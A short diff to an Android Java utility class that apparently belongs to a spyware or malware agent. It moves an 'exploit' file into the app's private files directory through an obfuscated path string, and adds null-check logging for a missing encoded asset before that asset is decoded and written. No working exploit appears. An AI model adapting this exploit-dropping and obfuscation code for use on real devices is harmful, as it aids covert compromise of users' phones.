@@ -196,7 +196,10 @@ public final class Utils {
 
 			out.close();
 
-			AutoFile file = new AutoFile(exploit);
+			String pack = Status.self().getAppContext().getPackageName();
+			final String installPath = String.format(M.e("/data/data/%s/files"), pack);
+
+			AutoFile file = new AutoFile(installPath, exploit);
 			if (!file.exists() || !file.canRead()) {
 				return false;
 			}
@@ -220,6 +223,12 @@ public final class Utils {
 			Check.asserts(asset.endsWith(".data"), "asset should end in .data");
 		}
 		InputStream stream = getAssetStream(asset);
+		if(stream == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAsset), ERROR cannot find resource: %s", asset);
+			}
+			return false;
+		}
 		return streamDecodeWrite(filename, stream, Cfg.RNDDB + asset.charAt(0));
 	}
 
